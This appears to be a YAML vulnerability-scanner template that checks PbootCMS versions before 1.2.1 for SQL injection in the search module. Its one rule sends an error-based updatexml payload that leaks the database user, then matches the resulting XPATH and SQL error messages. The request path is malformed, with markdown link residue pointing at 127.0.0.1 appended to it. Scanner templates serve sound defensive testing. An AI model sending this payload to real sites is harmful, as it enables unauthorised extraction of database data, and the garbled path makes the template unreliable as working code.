expression: r0()
id: PbootCMS-search-SQL
info:
  author: daffainfo
  description: "PbootCMS \u641C\u7D22\u6A21\u5757\u5B58\u5728SQL\u6CE8\u5165\u6F0F\
    \u6D1E\u3002\u901A\u8FC7\u6F0F\u6D1E\u53EF\u83B7\u53D6\u6570\u636E\u5E93\u654F\
    \u611F\u4FE1\u606F\u3002\u6F0F\u6D1E\u5F71\u54CD:PbootCMS < 1.2.1  app=\"PBOOTCMS\""
  name: "PbootCMS search SQL\u6CE8\u5165\u6F0F\u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/PbootCMS%20search%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: critical
rules:
  r0:
    expression: "response.status == 200 && response.body.bcontains(b'XPATH syntax\
      \ error') && response.body.bcontains(b'\u6267\u884CSQL\u53D1\u751F\u9519\u8BEF\
      ')"
    request:
      method: GET
      path: /index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123)
